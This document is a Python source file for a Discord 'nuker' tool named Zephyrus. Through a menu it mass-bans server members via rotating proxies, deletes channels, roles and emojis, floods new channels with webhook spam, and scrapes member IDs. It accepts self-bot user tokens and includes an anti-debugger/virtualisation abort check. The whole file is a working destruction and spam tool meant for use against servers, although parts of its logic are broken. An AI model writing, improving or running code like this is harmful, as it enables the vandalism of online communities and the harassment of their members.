import discord
from discord.ext import commands
from colorama import Fore, Style
import requests
import threading
import os
import json
import random
import time
import asyncio
from itertools import cycle
from pystyle import Colors, Colorate, Center
import ctypes
import datetime
import requests
from datetime import datetime
from time import strftime, gmtime

session = requests.Session()

a = Fore.WHITE
b = Fore.LIGHTBLACK_EX
c = Fore.LIGHTRED_EX
y = Fore.RESET
m = Fore.MAGENTA
l = Fore.LIGHTMAGENTA_EX

now = datetime.now()
s = now.strftime("%S")
x = f'{strftime(f"[%H:%M:{s}]", gmtime())}'

with open('zephyrus.json') as f:
    zephyrus = json.load(f)

token = zephyrus.get('Token')
prefix = zephyrus.get('Prefix')
channel_names = zephyrus.get('Channel-Names')
role_names = zephyrus.get('Role-Names')
reason = zephyrus.get('Reason')
webhook_names = zephyrus.get('Webhook-Names')
spam_messages = zephyrus.get('Spam-Messages')
guildname = zephyrus.get('Guild-Name')
langchange = zephyrus.get('Lang')

langs = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

if os.name == "nt":
  ctypes.windll.kernel32.SetConsoleTitleW("Zephyrus Nuker")

os.system('cls')

intents = discord.Intents.default()
intents.members = True


def check_token():
    if requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, intents=intents)


client.remove_command('help')
spam = True


class zephyrus:



  def channeldfunction(guild, channel):
        while True:
            r = session.delete(f"https://discord.com/api/v10/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{m}{x}{y} ratelimited sleeping for {l}{r.json()['retry_after']}{y} secs.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{m}{x}{y} {Style.BRIGHT}{b} Deleted Channel {a}[>>>]{c}{channel.strip()}")
                    break
                else:
                    break

  def emojidelete(guild, emoji):
        while True:
            r = session.delete(f"https://discord.com/api/v10/guilds/{guild}/emojis", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{m}{x}{y} ratelimited sleeping for {l}{r.json()['retry_after']}{y} secs.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{m}{x}{y} {Style.BRIGHT}{b} Deleted Emoji {a}[>>>] {c}{emoji.strip()}")
                    break
                else:
                    break

  def channelc(guild, name):
        while True:
            json = {'name': random.choice(channel_names), 'type': 0}
            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{m}{x}{y} ratelimited sleeping for {l}{r.json()['retry_after']}{y} secs.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{m}{x}{y} {Style.BRIGHT}{b} Created {a}[>>>]{c} {json['name']}")
                    if spam == True:
                      webhook = zephyrus.CreateWebhook(r.json()['id'])
                      threading.Thread(target=zephyrus.SendWebhook, args=(webhook,)).start()
                    break
                else:
                    break

  def roledfunction(guild, role):
        while True:
            r = session.delete(f"https://discord.com/api/v10/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{m}{x}{y} ratelimited sleeping for {l}{r.json()['retry_after']}{y} secs.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{m}{x}{y} {Style.BRIGHT}{b} Deleted Role {a}[>>>] {c}{role.strip()}")
                    break
                else:
                    break

  def rolecfunction(guild, role):

        try:
            json = {
                'hoist': 'true',
                'name': random.choice(role_names),
                'mentionable': 'true',
                'color': random.randint(1000000,9999999),
                'permissions': random.randint(1,10)
            }
            r = session.post(f'https://discord.com/api/v10/guilds/{guild}/roles', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{m}{x}{y} {Style.BRIGHT}{b} Created {a}[>>>]{c} {json['name']}")
            else:
                print(f"{m}{x}{y} {Style.BRIGHT}{b} Couldn't Create {a}[>>>]{c} {json['name']}")
        except:
            pass




  async def texttoid(ctx, user: discord.User, text):
    text = input("enter message [>>>] ")
    usertarg = input("enter id of target [>>>] ")
    target = client.get_user(int(usertarg))
    try:
        await target.send(text)
        print(f"sent text to [>>>] {usertarg}")
    except:
        print(f"failed to send text to [>>>] {usertarg}")
            



  

  def Ban(guild, member):
      proxies = open('proxies.txt').read().split('\n')
      proxy = cycle(proxies)
      try:
        json = {'reason': reason}
        r = session.put(f"https://discord.com/api/v10/guilds/{guild}/bans/{member}", headers=headers,json=json, proxies={
          "http": 'http://' + next(proxy)
        })
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"{m}{x}{y} ratelimited sleeping for {l}{r.json()['retry_after']}{y} secs.")
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{m}{x}{y} {Style.BRIGHT}{b} Banned {a}[>>>]{c} {member.strip()}")
      except:
          pass





  def CreateWebhook(channel):
        try:
            json = {
                'name': random.choice(webhook_names),
            }
            r = requests.post(f'https://discord.com/api/v10/channels/{channel}/webhooks', headers=headers, json=json)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass
          

  
  def SendWebhook(webhook):
        try:
            for i in range(1000):
                payload={
                    'username': random.choice(webhook_names),
                    'content': random.choice(spam_messages)
                }
                requests.post(webhook, json=payload)
        except:
            pass

  async def main():
        os.system(f'cls & title ~ Zephyrus Menu')
        print(f"<zephyrus.main.<locals>.signed in at developer 0x0000A71BX0E2>")

        logo = """
                                    ╔═╗╔═╗╔═╗╦ ╦╦ ╦╦═╗╦ ╦╔═╗
                                    ╔═╝║╣ ╠═╝╠═╣╚╦╝╠╦╝║ ║╚═╗
                                    ╚═╝╚═╝╩  ╩ ╩ ╩ ╩╚═╚═╝╚═╝

        """
        
        
        
        choices = """\t\t
        [ 1 ] banall                                                 
        [ 2 ] server bomb                                           
        [ 3 ] delete channels                                                 
        [ 4 ] spam channels
        [ 5 ] cycle ban
        [ 6 ] scrape        

        """

        
        print(Center.XCenter(Colorate.Vertical(Colors.purple_to_blue, logo, 3)))
        print(Colorate.Vertical(Colors.purple_to_blue, choices, 2))
     

        choice = input(f"\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Choice{Fore.WHITE} [>>>] ")
        if choice == '1':
          guild = input(f"\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>] ")
          print()
          members = open('zephyrus/zmem.txt')
          for i in range(10):
            for member in members:
              threading.Thread(target=zephyrus.Ban, args=(guild, member,)).start()
            members.close()
            time.sleep(2)
            await zephyrus.main()
          
        elif choice == '2':
            guild = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Guild ID{Fore.WHITE} [>>>] ')
            channelamount = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Channel Amount{Fore.WHITE} [>>>] ')
            roleamount = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Role Amount{Fore.WHITE} [>>>] ')
 

            members = open('zephyrus/zmem.txt')
            channels = open('zephyrus/zchan.txt')
            roles = open('zephyrus/zrole.txt')
            emojis = open('zephyrus/zemoji.txt')
            for i in range(10):
              for member in members:
                threading.Thread(target=zephyrus.Ban, args=(guild,member,)).start()
            for channel in channels:
                threading.Thread(target=zephyrus.channeldfunction,args=(guild,channel,)).start()
            for role in roles:
                threading.Thread(target=zephyrus.roledfunction,args=(guild,role,)).start()
            for i in range(int(channelamount)):
                threading.Thread(target=zephyrus.channelc,args=(guild,channel_names,)).start()
            for i in range(int(roleamount)):
                threading.Thread(target=zephyrus.rolecfunction, args=(guild,role_names,)).start()
            for emoji in emojis:
               threading.Thread(target=zephyrus.emojidelete,args=(guild,emoji,)).start()
            members.close()
            channels.close()
            roles.close()
            emojis.close
            time.sleep(2)
            await zephyrus.main()

        elif choice == '3':
          guild = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>] ')
          channels = open('zephyrus/zchan.txt')
          for channel in channels:
            threading.Thread(target=zephyrus.channeldfunction,args=(guild,channel,)).start()
            channels.close()
            time.sleep(2)
            await zephyrus.main()

        elif choice == '4': 
         guild = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>] ')
         channelamount = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Channel Amount{Fore.WHITE} [>>>] ')
         channels = open('zephyrus/zchan.txt')
         for i in range(int(channelamount)):
                threading.Thread(target=zephyrus.channelc,args=(guild,channel_names,)).start()
         channels.close()
         time.sleep(2)
         await zephyrus.main()

          
          


        elif choice == '6':
         guild = input(f"\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>] ")
         await client.wait_until_ready()
         guildOBJ = client.get_guild(int(guild))
         members = await guildOBJ.chunk()

        
         os.remove("zephyrus/zmem.txt")
         os.remove("zephyrus/zchan.txt")
         os.remove("zephyrus/zrole.txt")
         os.remove("zephyrus/zemoji.txt")

        elif choice == 'texttoid':
            await zephyrus.texttoid()

        
            

        membercount = 0
        with open('zephyrus/zmem.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {membercount} Member IDS")
            m.close()

        channelcount = 0
        with open('zephyrus/zchan.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {channelcount} Channel IDS")
            c.close()

        rolecount = 0
        with open('zephyrus/zrole.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {rolecount} Role IDS")
            r.close()

        emojicount = 0
        with open('zephyrus/zemoji.txt', 'a') as e:
            for emoji in guildOBJ.emojis:
                e.write(str(emoji.id) + "\n")
                emojicount += 1
            print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {emojicount} Emoji IDS\n")
            r.close()
            time.sleep(2)
            await zephyrus.main()
        
        

  async def DebuggerCheck(self):
        try:
            while True:
                if self.is_debugged() == True or self.is_virtualized() == True:
                    os.abort()
                    os._exit(0)
                await asyncio.sleep(7)
        except:
            pass

  def Startup():
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{Fore.LIGHTRED_EX}Invalid Token')
            input()
            os._exit(0)





@client.event 
async def on_ready():
  try:
    await zephyrus.main()
    await zephyrus.logger()
    await zephyrus.logs()
  except:
      await zephyrus.main()


if __name__ == "__main__":
  loop = asyncio.get_event_loop()
  loop.create_task(zephyrus().DebuggerCheck())
  zephyrus.Startup()


